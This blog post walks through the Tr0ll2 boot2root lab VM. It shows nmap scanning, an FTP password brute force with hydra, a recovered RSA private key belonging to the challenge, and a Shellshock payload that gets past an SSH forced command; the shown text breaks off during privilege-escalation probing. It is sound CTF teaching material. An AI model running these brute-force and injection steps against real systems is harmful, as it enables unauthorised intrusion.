<!DOCTYPE html>
<html lang="en-us">
<head>
  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> another troll tamed solving troll 2 | #!/slash/note</title>
  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/'>
  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="another troll tamed solving troll 2" />
<meta property="og:description" content="foreword
Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.
Here is my experience taming the troll, again." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2014-10-10T17:32:35+00:00" />
<meta property="article:modified_time" content="2014-10-10T17:32:35+00:00" />


  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="another troll tamed solving troll 2"/>
<meta name="twitter:description" content="foreword
Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.
Here is my experience taming the troll, again."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 

  
   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />

  
  
  
  
  
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-44457032-2', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu" style="visibility: visible;">
    <span id="nav">
      <ul>
         
        <li><a href="https://leonjza.github.io/">Home</a></li>
         
        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
         
        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
         
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://leonjza.github.io/blog/2014/09/18/from-persistence/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&text=another%20troll%20tamed%20solving%20troll%202" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&is_video=false&description=another%20troll%20tamed%20solving%20troll%202" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=another%20troll%20tamed%20solving%20troll%202&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&name=another%20troll%20tamed%20solving%20troll%202&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2ftr0ll-2%2c107%2f%22%3eTr0ll2%3c%2fa%3e%20is%20a%20successor%20in%20a%20boot2root%20series%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fMaleus21%22%3e%40Maleus21%3c%2fa%3e%20hosted%20over%20at%20%3ca%20href%3d%22http%3a%2f%2fvulnhub.com%2f%22%3eVulnHub%3c%2fa%3e.%20Having%20been%20able%20to%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f%22%3epwn%20Tr0ll1%3c%2fa%3e%2c%20I%20gave%20this%20one%20a%20shot%20too.%3c%2fp%3e%0a%3cp%3eHere%20is%20my%20experience%20taming%20the%20troll%2c%20again.%3c%2fp%3e" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&t=another%20troll%20tamed%20solving%20troll%202" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#foreword">foreword</a></li>
    <li><a href="#getting-started">getting started</a></li>
    <li><a href="#web-server">web server</a></li>
    <li><a href="#ftpee">ftpee</a></li>
    <li><a href="#noob-key">noob key</a></li>
    <li><a href="#shocking-isnt-it">shocking isn&rsquo;t it</a></li>
    <li><a href="#which-door-leads-to-r00t">which door leads to r00t</a></li>
    <li><a href="#bof-bof-bof-your-boat">bof bof bof your boat&hellip;</a></li>
    <li><a href="#the-exploit">the exploit</a></li>
    <li><a href="#trollin-the-rootin">trollin the rootin</a></li>
  </ul>
</nav>
    </div>
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        another troll tamed solving troll 2
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2014-10-10 17:32:35 &#43;0000 UTC" itemprop="datePublished">2014-10-10</time>
          
        </div>
        
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
            
             ,  
            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
            
             ,  
            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
            
             ,  
            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
            
             ,  
            <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
            
        </div>
        
        
      </div>
    </header>

  
    <div class="content" itemprop="articleBody">
      <h2 id="foreword">foreword</h2>
<p><a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>
<p>Here is my experience taming the troll, again.</p>
<h2 id="getting-started">getting started</h2>
<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-10 06:55 SAST
Nmap scan report <span style="color:#f00">for</span> 192.168.56.101
Host is up, received reset (0.00031s latency).
Not shown: <span style="color:#f60">997</span> filtered ports
Reason: <span style="color:#f60">997</span> no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP address (<span style="color:#f60">1</span> host up) scanned in 15.21 seconds
</code></pre></div><p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>
<h2 id="web-server">web server</h2>
<p>Opening up a browser to http://192.168.56.101 revealed a familiar image:</p>
<p><figure><img src="https://leonjza.github.io/images/troll2_web.png"/>
</figure>

Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>
<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/keep_trying
/dont_bother
/noob
/ok_this_is_it
</code></pre></div><p>The content served up at these URLs:</p>
<figure><img src="https://leonjza.github.io/images/troll2_noob.png"/>
</figure>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>
<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# <span style="color:#f00">for</span> line in <span style="color:#f00">$(</span>cat 200.txt<span style="color:#f00">)</span>; <span style="color:#f00">do</span> echo <span style="color:#87ceeb">&#34;==&gt;</span><span style="color:#eedd82">$line</span><span style="color:#87ceeb">&lt;==&#34;</span> &amp;&amp; wget 192.168.56.101/<span style="color:#eedd82">$line</span>/cat_the_troll.jpg; <span style="color:#f00">done</span>

==&gt;/ok_this_is_it&lt;==
--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... <span style="color:#f60">200</span> OK
Length: <span style="color:#f60">15831</span> (15K) [image/jpeg]
Saving to: <span style="color:#87ceeb">`</span>cat_the_troll.jpg.3<span style="color:#87ceeb">&#39;
</span><span style="color:#87ceeb">
</span><span style="color:#87ceeb">100%[=======&gt;] 15,831      --.-K/s   in 0s
</span><span style="color:#87ceeb">
</span><span style="color:#87ceeb">2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39;</span> saved [15831/15831]
</code></pre></div><p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ls -l
total <span style="color:#f60">68</span>
-rw-r--r-- <span style="color:#f60">1</span> root root    <span style="color:#f60">47</span> Oct <span style="color:#f60">10</span> 07:31 200.txt
-rw-r--r-- <span style="color:#f60">1</span> root root <span style="color:#f60">15831</span> Oct  <span style="color:#f60">4</span> 10:57 cat_the_troll.jpg
-rw-r--r-- <span style="color:#f60">1</span> root root <span style="color:#f60">15873</span> Oct  <span style="color:#f60">4</span> 10:31 cat_the_troll.jpg.1 <span style="color:#0f0">#&lt;---</span>
-rw-r--r-- <span style="color:#f60">1</span> root root <span style="color:#f60">15831</span> Oct  <span style="color:#f60">4</span> 10:57 cat_the_troll.jpg.2
-rw-r--r-- <span style="color:#f60">1</span> root root <span style="color:#f60">15831</span> Oct  <span style="color:#f60">4</span> 10:57 cat_the_troll.jpg.3
</code></pre></div><p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
</code></pre></div><p>Sweet, so lets print the last line of both and check what the diff is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2/c# tail -n <span style="color:#f60">1</span> cat_the_troll.jpg
8�z2��p�T�lj<span style="color:#87ceeb">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_�

root@kali:~/Desktop/troll2/c# tail -n <span style="color:#f60">1</span> cat_the_troll.jpg.1
8�z2��p�T�lj<span style="color:#87ceeb">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self <span style="color:#f00">for</span> the answer
</code></pre></div><p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>
<figure><img src="https://leonjza.github.io/images/troll2_y0ur_self.png"/>
</figure>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# head answer.txt
<span style="color:#eedd82">QQo</span>=
<span style="color:#eedd82">QQo</span>=
QUEK
QUIK
<span style="color:#eedd82">QUJNCg</span>==
QUMK
<span style="color:#eedd82">QUNUSAo</span>=
QUkK
<span style="color:#eedd82">QUlEUwo</span>=
QU0K
</code></pre></div><p>Looks a lot like base64 hey? Lets try decode it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
</code></pre></div><p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>
<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>
<p>My guess was that this has to be a password for either the FTP or SSH service.</p>
<h2 id="ftpee">ftpee</h2>
<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>
<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>
<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr &quot;\&quot;' &quot; '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>
<p>And finally, it was time to let hydra on the loose.</p>
<pre><code>root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;&gt;&quot; - 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;404&quot; - 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;again&quot; - 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;agent&quot; - 4 of 13689 [child 3]
[...]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;Tr0ll&quot; - 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;tr0ll2&quot; - 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;tr0ll_again.jpg&quot; - 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08
</code></pre><p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
<span style="color:#f60">220</span> Welcome to Tr0ll FTP... Only noobs stay <span style="color:#f00">for</span> a <span style="color:#f00">while</span>...
Name (192.168.56.101:root): Tr0ll
<span style="color:#f60">331</span> Please specify the password.
Password:
<span style="color:#f60">230</span> Login successful.
</code></pre></div><p>Yay! Progress! Lets take a closer look&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; pas
Passive mode on.

ftp&gt; ls
<span style="color:#f60">227</span> Entering Passive Mode (192,168,56,101,73,4)
<span style="color:#f60">150</span> Here comes the directory listing.
-rw-r--r--    <span style="color:#f60">1</span> <span style="color:#f60">0</span>        <span style="color:#f60">0</span>            <span style="color:#f60">1474</span> Oct <span style="color:#f60">04</span> 01:09 lmao.zip
<span style="color:#f60">226</span> Directory send OK.

ftp&gt; get lmao.zip
local: lmao.zip remote: lmao.zip
<span style="color:#f60">227</span> Entering Passive Mode (192,168,56,101,105,73)
<span style="color:#f60">150</span> Opening BINARY mode data connection <span style="color:#f00">for</span> lmao.zip (<span style="color:#f60">1474</span> bytes).
<span style="color:#f60">226</span> Transfer complete.
<span style="color:#f60">1474</span> bytes received in 0.00 secs (621.0 kB/s)

ftp&gt; bye
<span style="color:#f60">221</span> Goodbye.
</code></pre></div><h2 id="noob-key">noob key</h2>
<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>
<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: <span style="color:#0f0">#ItCantReallyBeThisEasyRightLOL</span>
  inflating: noob

root@kali:~# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
<span style="color:#eedd82">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span>==
-----END RSA PRIVATE KEY-----
</code></pre></div><p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2# chmod <span style="color:#f60">600</span> noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
</code></pre></div><h2 id="shocking-isnt-it">shocking isn&rsquo;t it</h2>
<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>
<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>
<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh noob@192.168.56.101 -i noob -t <span style="color:#87ceeb">&#39;() { :;}; /bin/bash&#39;</span>
noob@Tr0ll2:~$ id
<span style="color:#eedd82">uid</span>=1002(noob) <span style="color:#eedd82">gid</span>=1002(noob) <span style="color:#eedd82">groups</span>=1002(noob)
</code></pre></div><p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command=&quot;echo TRY HARDER LOL!&quot; </code> before the public key.</p>
<h2 id="which-door-leads-to-r00t">which door leads to r00t</h2>
<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>
<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>
<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2
    (/dev/pts/0) at 0:48 ...

